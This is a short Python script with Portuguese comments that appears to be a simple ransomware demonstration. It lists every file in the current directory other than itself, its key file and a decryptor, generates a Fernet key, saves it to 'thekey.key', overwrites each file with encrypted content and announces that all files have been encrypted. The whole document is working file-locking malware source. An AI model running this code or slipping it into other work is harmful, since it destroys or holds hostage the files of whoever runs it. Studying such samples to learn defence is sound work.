import os
from cryptography.fernet import Fernet

files = []
# Itera sobre os arquivos no diretório atual
for file in os.listdir():
# Ignora os arquivos com os nomes 'Crypto.py', 'thekey.key', e 'decrypt.py'
    if file == "Crypto.py" or file == "thekey.key" or file == "decrypt.py":
        continue
# Verifica se o elemento na iteração é um arquivo    
    if os.path.isfile(file):
# Adiciona o nome do arquivo à lista 'files'        
        files.append(file)
# Exibe a lista de arquivos criptografados até o momento
        print("Arquivos criptografados: ", files)
# Gera uma chave para a criptografia
key = Fernet.generate_key()
# Cria o arquivo 'thekey.key' e escreve a chave nele para descriptografar os arquivos        
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
# Itera sobre os arquivos criptografados para realizar a criptografia
for file in files:
# Abre o arquivo para leitura em modo binário ('rb')
    with open(file, "rb") as thefile:
# Lê o conteúdo do arquivo        
        content = thefile.read()
# Aqui, é realizada a criptografia do conteúdo do arquivo usando a chave 'key'        
    content_encrypt = Fernet(key).encrypt(content)
# Abre o arquivo em modo de escrita binária ('wb')
# Sobrescreve o conteúdo original do arquivo com o conteúdo criptografado    
    with open(file, "wb") as thefile:
        thefile.write(content_encrypt)
# Exibe uma mensagem indicando que todos os arquivos foram criptografados
print("Todos os seus arquivos foram criptografados!!")            